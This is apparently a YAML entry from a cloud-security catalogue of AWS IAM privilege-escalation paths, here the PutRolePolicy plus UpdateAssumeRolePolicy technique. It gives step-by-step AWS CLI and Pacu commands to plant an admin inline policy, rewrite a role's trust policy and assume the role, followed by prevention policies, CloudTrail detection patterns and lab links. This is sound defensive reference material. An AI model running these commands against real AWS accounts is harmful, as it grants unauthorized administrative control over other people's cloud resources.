id: "iam-021"
name: "iam:PutRolePolicy + iam:UpdateAssumeRolePolicy"
category: "lateral-movement"
services:
  - iam

permissions:
  required:
    - permission: "iam:PutRolePolicy"
      resourceConstraints: "Must have access to add inline policies to the target role"
    - permission: "iam:UpdateAssumeRolePolicy"
      resourceConstraints: "Must have permission to modify the trust policy of the target role"
  additional:
    - permission: "iam:ListRoles"
      resourceConstraints: "Helpful for discovering available roles to target"
    - permission: "iam:GetRole"
      resourceConstraints: "Useful for viewing current role trust policies and attached permissions"
    - permission: "iam:ListRolePolicies"
      resourceConstraints: "Helpful for viewing current inline policies on the target role"
    - permission: "iam:GetRolePolicy"
      resourceConstraints: "Useful for retrieving and examining the content of existing inline policies"

description: "A principal with `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by first adding an inline policy with administrative permissions to a target role, then modifying that role's trust policy to allow the attacker to assume it. The key insight is that when a principal is explicitly named in a role's trust policy, that principal can assume the role without needing separate `sts:AssumeRole` permissions - the trust policy itself grants this capability. This attack is often overlooked because each permission appears innocuous when evaluated separately: `iam:PutRolePolicy` seems like a reasonable permission for managing role permissions, and `iam:UpdateAssumeRolePolicy` seems reasonable for managing trust relationships. However, when combined, they create a complete privilege escalation path."

prerequisites:
  admin:
    - "A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on"
  lateral:
    - "A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` permissions on"

exploitationSteps:
  awscli:
    - step: 1
      command: |
        # Set the target role name
        TARGET_ROLE="target-role-name"
      description: "Define the target role that will be modified and assumed"
    - step: 2
      command: |
        # Create an admin policy document
        cat > admin-policy.json <<EOF
        {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": "*",
              "Resource": "*"
            }
          ]
        }
        EOF
      description: "Create a policy document with administrative permissions (all actions on all resources)"
    - step: 3
      command: |
        # Add the admin inline policy to the target role
        aws iam put-role-policy \
          --role-name $TARGET_ROLE \
          --policy-name AdminEscalation \
          --policy-document file://admin-policy.json
      description: "Add the administrative inline policy to the target role using iam:PutRolePolicy"
    - step: 4
      command: |
        # Wait for IAM policy changes to propagate (15 seconds)
        sleep 15
      description: "Wait for the inline policy to propagate across AWS infrastructure"
    - step: 5
      command: |
        # Get your current principal ARN
        CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
        echo "Current principal ARN: $CURRENT_ARN"
      description: "Retrieve your current principal ARN to add to the trust policy"
    - step: 6
      command: |
        # Get the account ID
        ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

        # Create a new trust policy that includes your principal
        cat > trust-policy.json <<EOF
        {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "AWS": "$CURRENT_ARN"
              },
              "Action": "sts:AssumeRole"
            }
          ]
        }
        EOF
      description: "Create a new trust policy document that explicitly allows your principal to assume the role"
    - step: 7
      command: |
        # Update the role's trust policy
        aws iam update-assume-role-policy \
          --role-name $TARGET_ROLE \
          --policy-document file://trust-policy.json
      description: "Update the role's trust policy using iam:UpdateAssumeRolePolicy to allow your principal to assume it"
    - step: 8
      command: |
        # Wait for trust policy changes to propagate (15 seconds)
        sleep 15
      description: "Wait for the trust policy to propagate across AWS infrastructure"
    - step: 9
      command: |
        # Assume the role (no prior sts:AssumeRole permission needed)
        CREDENTIALS=$(aws sts assume-role \
          --role-arn "arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE" \
          --role-session-name privileged-session \
          --output json)

        # Extract the temporary credentials
        export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
        export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
        export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')
      description: "Assume the role using sts:AssumeRole. Note that no prior sts:AssumeRole permission is needed because the trust policy grants this capability automatically when a principal is explicitly named."
    - step: 10
      command: |
        # Verify administrative access using the assumed role credentials
        aws iam list-users --max-items 5
      description: "Verify that you now have administrative access by listing IAM users with the assumed role credentials"
  pacu:
    - step: 1
      command: |
        # Use Pacu to add an admin inline policy to the target role
        run iam__put_role_policy --role-name target-role-name --policy-name AdminEscalation --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
      description: "Use Pacu to add an administrative inline policy to the target role"
    - step: 2
      command: |
        # Use Pacu to update the role's trust policy
        run iam__update_assume_role_policy --role-name target-role-name --principal-arn YOUR_PRINCIPAL_ARN
      description: "Use Pacu to update the role's trust policy to allow your principal to assume it"
    - step: 3
      command: |
        # Use Pacu to assume the role
        run sts__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role-name
      description: "Use Pacu to assume the role and obtain temporary credentials with administrative permissions"

limitations: |
  This attack provides administrative access because the attacker controls the inline policy document content. Unlike `iam:AttachRolePolicy` (which requires choosing from existing managed policies), `iam:PutRolePolicy` allows the attacker to embed any policy document directly into the role, guaranteeing administrative permissions regardless of what policies exist in the environment.

  The attack requires that the starting principal has both permissions (`iam:PutRolePolicy` AND `iam:UpdateAssumeRolePolicy`) scoped to the same target role. If these permissions are scoped to different roles, the attack path is not viable without additional steps.

  A critical aspect of this attack is that named principals in trust policies can assume roles WITHOUT needing explicit `sts:AssumeRole` permissions on their own policies. When you add your principal ARN to a role's trust policy, the trust policy itself grants you the ability to assume that role. This is often misunderstood and leads to the false belief that `iam:UpdateAssumeRolePolicy` alone cannot lead to privilege escalation.

  The attack leaves clear audit trails in CloudTrail (PutRolePolicy and UpdateAssumeRolePolicy events), but it can be executed quickly (within 30-45 seconds including propagation delays).

  Inline policies can be harder to detect in security reviews because they are embedded in the role object rather than referenced as separate policy entities. Some IAM policy management tools may not highlight inline policies as prominently as managed policy attachments.

recommendation: |
  Restrict `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions should rarely be granted together on the same target role, as this combination creates a direct privilege escalation path.

  **Prevention strategies:**

  1. Restrict `iam:PutRolePolicy` to prevent inline policy modification on sensitive roles:
  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PutRolePolicy",
    "Resource": "arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*",
    "Condition": {
      "StringNotLike": {
        "iam:RoleName": ["admin-*", "privileged-*"]
      }
    }
  }
  ```

  2. Restrict `iam:UpdateAssumeRolePolicy` to prevent trust policy modification on sensitive roles:
  ```json
  {
    "Effect": "Allow",
    "Action": "iam:UpdateAssumeRolePolicy",
    "Resource": "arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*",
    "Condition": {
      "StringNotLike": {
        "iam:RoleName": ["admin-*", "privileged-*"]
      }
    }
  }
  ```

  3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if administrative inline policies are added

  4. Separate the permissions - avoid granting both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` to the same principal for the same target roles

  5. Require MFA for sensitive trust policy modifications and inline policy operations

  6. Implement regular audits of role trust policies and inline policies, as both can be less visible than managed policies in standard IAM reviews

  7. Use Service Control Policies (SCPs) to prevent the addition of overly permissive inline policies or trust policy modifications on critical roles

  8. Implement deny policies that explicitly block modification of trust policies or inline policies on administrative or critical roles

  **Detection strategies:**

  Monitor CloudTrail for the following event patterns:
  - `PutRolePolicy` API calls with policy documents containing broad permissions (e.g., `"Action": "*"` or `"Action": "iam:*"`)
  - `UpdateAssumeRolePolicy` API calls that add new principals to trust policies
  - Sequential occurrences of `PutRolePolicy` followed by `UpdateAssumeRolePolicy` on the same role within a short time window
  - `AssumeRole` API calls immediately following `UpdateAssumeRolePolicy` events
  - Trust policy modifications that add specific principal ARNs (as opposed to service principals like `ec2.amazonaws.com`)

  Set up CloudWatch alarms for unexpected changes to role trust policies and inline role policies. Investigate any trust policy modifications combined with inline policy additions. Consider implementing automated responses to roll back suspicious changes to critical role trust policies or inline policies.

discoveredBy:
  name: "Spencer Gietzen"
  organization: "Rhino Security Labs"
  date: "2018"

references:
  - title: "HackTricks - AWS - IAM Privesc"
    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-iam-privesc/index.html#iamupdateassumerolepolicy"

relatedPaths:
  - "iam-007"
  - "iam-014"
  - "iam-015"
  - "iam-018"

detectionTools:
  cloudsplaining: https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L111-L115
  pacu: https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L345-L360
  prowler: https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L87-L92

detectionRules:
  - platform: "CloudSIEM"
    ruleId: "TBD"
    url: "https://docs.datadoghq.com/security/default_rules/"

learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/iam-putrolepolicy+iam-updateassumerolepolicy"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: "IAM-PutRolePolicy (privesc12) and IAM-UpdatingAssumeRolePolicy (privesc14)"
    description: "Deploy Terraform into your own AWS account and practice individual exploitation paths"
  cybr:
    type: closed-source
    description: "Hosted learning environment with interactive AWS security labs"
    scenario: https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/
    scenarioPricingModel: paid
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The principal with iam:PutRolePolicy and iam:UpdateAssumeRolePolicy permissions on a target role. Can be an IAM user or role.
  - id: target_role
    label: Existing Target Role
    type: resource
    description: |
      An existing IAM role that will be modified. The attacker will add an inline policy with administrative permissions and update its trust policy.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      After adding an inline policy with administrative permissions and assuming the role, the attacker gains full administrative access.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the inline policy grants elevated but non-administrative permissions, the attacker gains partial privilege escalation after assuming the role.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the inline policy only grants minimal permissions, the privilege escalation may not provide meaningful additional access.
  edges:
  - from: start
    to: target_role
    label: iam:PutRolePolicy + iam:UpdateAssumeRolePolicy + sts:AssumeRole
    description: |
      The attacker first adds an inline policy with administrative permissions to the target role, then updates the role's trust policy to allow their principal to assume it, and finally assumes the role. No prior sts:AssumeRole permission is needed - the trust policy grants this capability.

      Commands:
      ```bash
      # Step 1: Add inline policy
      aws iam put-role-policy \
        --role-name target-role \
        --policy-name AdminEscalation \
        --policy-document file://admin-policy.json

      # Step 2: Update trust policy
      aws iam update-assume-role-policy \
        --role-name target-role \
        --policy-document file://trust-policy.json

      # Step 3: Assume the role
      aws sts assume-role \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role \
        --role-session-name privesc-session
      ```
  - from: target_role
    to: admin_outcome
    label: If admin inline policy added
    branch: A
    condition: admin
    description: |
      If the inline policy grants administrative permissions, the attacker gains full administrative access.
  - from: target_role
    to: partial_outcome
    label: If elevated inline policy added
    branch: B
    condition: some_permissions
    description: |
      If the inline policy grants elevated but non-administrative permissions, the attacker gains partial privilege escalation.
  - from: target_role
    to: minimal_outcome
    label: If limited inline policy added
    branch: C
    condition: no_permissions
    description: |
      If the inline policy only grants minimal permissions, the attacker may not gain meaningful additional access.
